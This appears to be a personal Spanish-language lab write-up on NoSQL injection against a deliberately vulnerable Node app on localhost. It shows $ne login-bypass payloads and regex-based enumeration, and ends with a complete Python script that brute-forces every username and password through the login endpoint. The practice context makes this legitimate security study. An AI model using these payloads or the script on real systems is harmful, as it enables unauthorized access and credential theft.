------
Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:

- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)

## Notas de la practica

Bueno una vez la maquina desplegada vamos a proceder a ver la siguiente web:

![[Pasted image 20250826113225.png]]

tenemos otra opción que dice `user Lookup` donde nos permite buscar usuario al parecer:

![[Pasted image 20250826113304.png]]

vamos a listar algunos que si conozco que serian los siguiente:

![[Pasted image 20250826113520.png]]
vemos que nos da información básica del usuario y el rol.

![[Pasted image 20250826113602.png]]

en este panel podemos usar una [[SQLI]] pero no vamos a llegar.

Vamos a ir a la web de https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection para ver las NOSQLI y vamos a ver algunas cosas:

![[Pasted image 20250826113743.png]]

como podemos ver lo que tratamos de hacer es burlar los paneles con con especies de condiciones tanto si la data va en Json o no por lo que podemos intentar este tipo de ataque pero lo vamos a hacer con ayuda de BurpSuite para facilitar un poco:

![[Pasted image 20250826114036.png]]

podemos ver que la data se envía por `POST` y en formato `Json` esto nos lo dice en el `Content-Type`, entonces viendo que no podemos usar [[SQLI]] podemos comenzar a intentar las NoSQLI:

![[Pasted image 20250826114232.png]]

en este caso agregamos una estructura y lo que le decimos es `password: {"$ne (no igual)", "admin1234"}` vemos que nos responde el servidor:

![[Pasted image 20250826114342.png]]

vemos que logramos pasar.

Ahora supongamos que no conocemos ni `usuario` ni `contraseña`, básicamente seria lo mismo:
![[Pasted image 20250826114514.png]]

en este caso nos permite pasar pero como guest.

Esto es genial pero como atacante lo que a nosotros nos interesa es lograr obtener información de todos los usuario en general y para esto podemos hacerlo de la siguiente manera:
![[Pasted image 20250826114833.png]]

nosotros podemos con ayuda de regex ir obteniendo información de diferentes usuario por medio de la respuesta ya que como vemos con `g` automáticamente me permite pasar como el usuario que comienza con la letra g, ahora esto lo podemos hacer para completar todo el nombre de usuario, seria ir completando letra por letra hasta tener todo el usuario:

![[Pasted image 20250826115041.png]]

como vemos siempre que una parte este bien pues logramos ingresar correctamente.

Con esto ya podemos intentar hacer un ataque de fuerza bruta para ir componiendo los usuario y lo mismo para las contraseñas.

Nosotros podemos conocer la longitud total de las contraseñas con regex de la siguiente forma:

![[Pasted image 20250826120126.png]]
donde si el valor es exacto o menor nos permite pasar pero si es menor nos dará un error.

Vamos a jugar con un script en Python para hacerlo:

```python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal,string

from six import iteritems

# CTRL+C
def def_handler(sig, frem):
    print("\n[!] Saliendo.....\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global Var
login_url="http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def uncoverLetter():

    userLetterList = []
    for character1 in characters:
        post_data  = '{"username":{"$regex":"^%s"},"password":{"$ne":"1234"}}' % (character1)
        headers = {"Content-Type": "application/json"}

        r = requests.post(login_url,headers=headers, data=post_data)


        if "Logged in as user" in r.text:

                for character2 in characters:
                    inituser=""
                    post_data  = '{"username":{"$regex":"^%s%s"},"password":{"$ne":"1234"}}' % (character1,character2)
                    headers = {"Content-Type": "application/json"}

                    r = requests.post(login_url,headers=headers, data=post_data)

                    if "Logged in as user" in r.text:
                        inituser=character1+character2
                        userLetterList.append(inituser)

    return userLetterList




def uncoverLeng(user):


    for leng in range(1, 50):
        post_data  = '{"username":"%s","password":{"$regex":".{%d}"}}' % (user,leng)
        headers = {"Content-Type": "application/json"}

        r = requests.post(login_url,headers=headers, data=post_data)

        if "Logged in as user" not in r.text:
            return leng-1




def uncoverUsername(init):

    print("\nDiscovery Users\n")

    p1 = log.progress("Fuerza Bruta")
    p2 = log.progress("User")


    username=init
    for position in range(1, 15):
        for character in characters:
            post_data  = '{"username":{"$regex":"^%s%s"},"password":{"$ne":"null"}}' % (username ,character)

            headers = {"Content-Type": "application/json"}

            p1.status(post_data)

            r = requests.post(login_url, headers=headers, data=post_data)

            if "Logged in as user" in r.text:
                username += character
                p2.status(username)
                break
    p1.success()
    p2.success()
    os.system("clear")
    return username

def uncoverPassword(users):

    usersAndpassword = {}

    p1 = log.progress("User")
    p2 = log.progress("Password")

    for user in users:
        passoword = ""
        length = uncoverLeng(user)
        p1.status(user)
        for position in range(1, length):
            for character in characters:
                post_data  = '{"username":"%s","password":{"$regex":"^%s%s"}}' % (user,passoword,character)
                headers = {"Content-Type": "application/json"}

                r = requests.post(login_url, headers=headers, data=post_data)


                if "Logged in as user" in r.text:
                    passoword+=character
                    p2.status(passoword)
                    break
        usersAndpassword[user] = passoword
    return usersAndpassword



def main():
    os.system("clear")
    users = []
    letters = uncoverLetter()
    for letter in letters:
        users.append(uncoverUsername(letter))

    print("[+] Users: \n")
    for user in users:
        print("-" + user)

    print("\n Discovery Passswords\n")
    listCredentials = uncoverPassword(users)

    time.sleep(2)
    os.system("clear")

    print("\n[+] List Credentials\n")

    for user, password in listCredentials.items():
        print("[+] User: " + user)
        print("[+] Password: " + password  + "\n")


if __name__ == '__main__':
    main()
```

y en este caso el output se vería de la siguiente manear:

![[Pasted image 20250826155339.png]]